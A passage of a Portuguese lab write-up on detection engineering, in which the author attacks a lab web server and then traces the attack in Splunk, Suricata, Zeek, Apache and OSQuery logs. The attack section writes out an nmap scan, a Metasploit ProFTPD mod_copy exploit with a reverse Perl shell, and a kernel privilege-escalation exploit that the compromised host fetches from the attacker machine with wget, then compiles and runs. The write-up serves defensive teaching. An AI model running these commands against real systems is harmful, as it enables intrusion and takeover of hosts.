class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&#x27;/etc/nxlog/nxlog.conf&#x27;}</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="splunk">Splunk<a href="#splunk" class="hash-link" aria-label="Link direto para Splunk" title="Link direto para Splunk">‚Äã</a></h2><p>Os logs s√£o enviados ao Splunk por meio do agente do <a href="https://nxlog.co/" target="_blank" rel="noopener noreferrer">NXLog</a> pela porta <code>514/udp</code> e caem no index chamado &quot;syslog&quot;. O problema √© que esse index ainda n√£o existe. Teremos que configura-lo na m√£o.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="index">Index<a href="#index" class="hash-link" aria-label="Link direto para Index" title="Link direto para Index">‚Äã</a></h3><p>Para configurar um index configurar um index. Basta clicar em <code>Settings</code> &gt; <code>Indexes</code> &gt; <code>New Index</code></p><p><img loading="lazy" alt="settings" src="/assets/images/splunk-settings-6c5918c81f3b27aac525f5cdeb86916f.png" width="658" height="586" class="img_ev3q">{: width=&quot;400&quot; heigth=&quot;400&quot;} </p><p>Depois basta colocar o nome e dale:</p><p><img loading="lazy" alt="index" src="/assets/images/splunk-settings-index-e7edfbb2621ef4a7b513ecbef65b41da.png" width="808" height="802" class="img_ev3q">{: width=&quot;400&quot; heigth=&quot;400&quot;}</p><p>Feito isso seu lab est√° pronto para a maldade.</p><h1>Attack</h1><p>O ataque n√£o foi grande coisa. Meu foco era ver como a o ataque poderia ser observado nos logs a fim de exemplificar como pode ser usado.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="scanning">Scanning<a href="#scanning" class="hash-link" aria-label="Link direto para Scanning" title="Link direto para Scanning">‚Äã</a></h2><p>Um scan simples com nmap para come√ßar.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -p- </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.210</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}</p><p><img loading="lazy" alt="nmap" src="/assets/images/nmap1-554281ff45181aac4638277739d51f51.png" width="983" height="384" class="img_ev3q"></p><p>Haviam v√°rios vetores de ataque, fui no primeiro que li na tela rsrs.</p><p>Ao ver a combina√ß√£o do ProFTP + Apache, podemos supor que temos permiss√£o de grava√ß√£o no SITEPATH. Ent√£o, se explorarmos o servi√ßo ProFTPD podemos abusar da permiss√£o no Apache SITEPATH, o que nos permitir√° obter shell reverso. Mas l√≥gico que tudo isso √© autom√°tico rs, eu s√≥ vou aperta um bot√£o. </p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting">Exploiting<a href="#exploiting" class="hash-link" aria-label="Link direto para Exploiting" title="Link direto para Exploiting">‚Äã</a></h2><p>Usando o <code>msfconsole</code> &gt; <code>search proftp</code> e encontrei o exploit <a href="https://www.exploit-db.com/exploits/37262" target="_blank" rel="noopener noreferrer">modcopy execution</a>.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use proftpd_modcopy_exec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> RHOST </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.210</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> TARGETURI /</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> SITEPATH /var/www/html/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> payload payload/cmd/unix/reverse_perl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> LHOST </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.109</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}
<img loading="lazy" alt="proftp-exploit.png" src="/assets/images/proftp-exploit-cbacd67f53a807680593449da7a03a24.png" width="946" height="395" class="img_ev3q"></p><p>Agora com acesso ao shell, podemos escalonar privil√©gio.
A hist√≥ria √© mais longa do que isso, mas resumindo, usei um exploit para aquele kernel em espec√≠fico.</p><p>No Kali Linux executei uma busca por aquela vers√£o do kernel no exploitdb, e deixei o c√≥digo malicioso dispon√≠vel para download. </p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit linux </span><span class="token builtin class-name">local</span><span class="token plain"> kernel </span><span class="token number" style="color:#36acaa">3.13</span><span class="token plain"> ubuntu </span><span class="token number" style="color:#36acaa">14.04</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">searchsploit -m </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c /tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 -m http.server </span><span class="token number" style="color:#36acaa">80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Kali&quot;}</p><p><img loading="lazy" alt="searchsploit.png" src="/assets/images/searchsploit-446565c82ac1b2043acd838e7f2bd46b.png" width="939" height="402" class="img_ev3q"></p><p>Voltando a console que ganhamos acesso com o usu√°rio www-data, vamos baixar o exploit.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.56.109/37292.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gcc </span><span class="token number" style="color:#36acaa">37292</span><span class="token plain">.c -o salve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./salve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">whoami</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Shell Web Server&quot;}</p><p><img loading="lazy" alt="salve" src="/assets/images/salve-77fe455fd5f76f8124b30ea6063a1b17.png" width="674" height="220" class="img_ev3q"></p><p>Aqui √© o fim da explora√ß√£o, vamos ao lado azul da for√ßa ver o que foi loggado ao longo do processo. </p><h1>Detect</h1><p>Vou me basear no Mitre ATT&amp;CK para descrever a t√©cnica usada, e no cyber kill chain para descrever os momentos do ataque. Clique na imagem abaixo para verificar o gr√°fico.</p><p><img loading="lazy" alt="DectEng.png" src="/assets/images/DectEng-16f9cacdfa7925b95d9bf6b52bb424c9.png" width="1353" height="699" class="img_ev3q"></p><ul><li>A curva vai de T‚ÇÄ/M‚ÇÄ √° M’¢/T’¢;</li><li>Observe que para cada tempo T‚Çõ, temos diferentes capacidades de detec√ß√£o variando de acordo com a ferramenta que registra aquele momento M‚Çõ do atacante.</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan">Detecting Scan<a href="#detecting-scan" class="hash-link" aria-label="Link direto para Detecting Scan" title="Link direto para Detecting Scan">‚Äã</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---suricata">Detecting Scan - Suricata<a href="#detecting-scan---suricata" class="hash-link" aria-label="Link direto para Detecting Scan - Suricata" title="Link direto para Detecting Scan - Suricata">‚Äã</a></h3><p>A seguinte search poderia ser feita para identificar quais origens tem feito comunica√ß√£o com o web server e quais alertas foram gerados pelo Suricata.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> dest_ip</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">src_ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dest_ip</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dest_port</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">app_proto</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">alert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">signature</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> src_ip</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> alert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">category</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="suricata" src="/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><blockquote><p>Existem outros logs de quando eu ainda estava testando o laborat√≥rio, mas a explora√ß√£o foi feita pelo IP final .109. </p></blockquote><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-scan---zeek">Detecting Scan - Zeek<a href="#detecting-scan---zeek" class="hash-link" aria-label="Link direto para Detecting Scan - Zeek" title="Link direto para Detecting Scan - Zeek">‚Äã</a></h3><p>Com as informa√ß√µes da busca anterior, podemos ver com quantos bytes foram trafegados entre os hosts:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"> sourcetype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;zeek:json&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> bin span</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">3</span><span class="token plain">min _time </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="zeek" src="/assets/images/suricataXnmap-39389ce00ec333137a75d501142e00af.png" width="1912" height="593" class="img_ev3q">
<em>clique na imagem para expandir</em></p><p>Vemos um volume absurdo de varia√ß√£o de portas destino e tamb√©m dos bytes trafegados.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-exploit">Detecting Exploit<a href="#detecting-exploit" class="hash-link" aria-label="Link direto para Detecting Exploit" title="Link direto para Detecting Exploit">‚Äã</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---splunk">Detecting ProFTP Exploit - Splunk<a href="#detecting-proftp-exploit---splunk" class="hash-link" aria-label="Link direto para Detecting ProFTP Exploit - Splunk" title="Link direto para Detecting ProFTP Exploit - Splunk">‚Äã</a></h3><p>Pelos logs do apache podemos buscar pelo IP do atacante e separar as requisi√ß√µes pelo c√≥digo de retorno.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;syslog&quot;</span><span class="token plain"> Hostname</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> eval decodedHTTPURL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">urldecode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HTTPURL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HTTPMethod</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">decodedHTTPURL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> HTTPResponseStatus</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> HTTPUserAgent</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><p><img loading="lazy" alt="apacheperl" src="/assets/images/apache_perl-f41a1c5b9d9b0161d37108ccc2c1b7f6.png" width="1899" height="867" class="img_ev3q"></p><p>Encontramos a requisi√ß√£o maliciosa.</p><p>Pelos logs do zeek, temos evidencias das conex√µes na porta 4444, confirmando o sucesso <strong>de rede</strong> da requisi√ß√£o acima.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">index</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">  id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.109&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;192.168.56.210&quot;</span><span class="token plain"> id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4444</span><span class="token plain"> sourcetype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;zeek:json&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> stats </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">orig_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_h</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">resp_p</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orig_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">resp_ip_bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> _time</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;Splunk Search&quot;}</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="detecting-proftp-exploit---osquery">Detecting ProFTP Exploit - OSQuery<a href="#detecting-proftp-exploit---osquery" class="hash-link" aria-label="Link direto para Detecting ProFTP Exploit - OSQuery" title="Link direto para Detecting ProFTP Exploit - OSQuery">‚Äã</a></h3><p>Agora √° n√≠vel de m√°quina, podemos verificar no OSQuery quais os efeitos do exploit.
Busquei primeiro pelos processos criados que possuem um command line com o IP do atacante.</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> processes </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> cmdline </span><span class="token operator" style="color:#393A34">LIKE</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%192.168.56.109%&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;OSQuery Search&quot;}
<img loading="lazy" alt="osquery-perl.png" src="/assets/images/osquery-perl-7c431467a23b4067296b942f6f3a9398.png" width="1887" height="606" class="img_ev3q"></p><p>Como uma conex√£o foi estabelecida anteriormente, busquei por sockets abertos com o IP do atacante tamb√©m:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> process_open_sockets </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> remote_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&#x27;192.168.56.109&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&quot;OSQuery Search&quot;}</p><p><img loading="lazy" alt="osquery-socketremotaddr.png" 